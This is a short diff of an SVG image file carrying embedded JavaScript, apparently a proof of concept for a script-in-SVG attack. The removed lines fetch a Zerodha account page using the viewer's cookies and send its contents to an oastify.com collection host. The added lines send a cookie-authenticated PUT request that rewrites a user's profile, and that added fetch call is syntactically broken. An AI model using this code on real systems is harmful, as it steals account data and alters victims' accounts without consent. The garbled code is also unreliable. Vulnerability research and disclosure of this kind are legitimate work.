@@ -1,12 +1,21 @@
 <svg xmlns="http://www.w3.org/2000/svg">
- <script>
-  fetch("https://thechatter.zerodha.com/account", {
-   method: "GET",
-   credentials: "include"
-  })
-  .then(res => res.text())
-  .then(data => {
-   fetch("https://c8lqholsexggqulev5hdzqyef5lw9mxb.oastify.com/log?data=" + encodeURIComponent(data));
+ <script><![CDATA[
+  fetch("photo_url":"https://usefoolsite.netlify.app/poc2.svg", {
+   method: "PUT",
+   credentials: "include",
+   headers: {
+    "Content-Type": "application/json"
+   },
+   body: JSON.stringify({
+    name: "new",
+    handle: "",
+    bio: "",
+    confirmation_redirect_pathname: "/account",
+    photo_url: "https://substack-post-media.s3.amazonaws.com/public/images/f741a9b4-def1-438c-99b4-586cd05e294d_144x144.png",
+    user_id: "431284269",
+    needs_photo: "false",
+    token: ""
+   })
   });
- </script>
+ ]]></script>
 </svg>
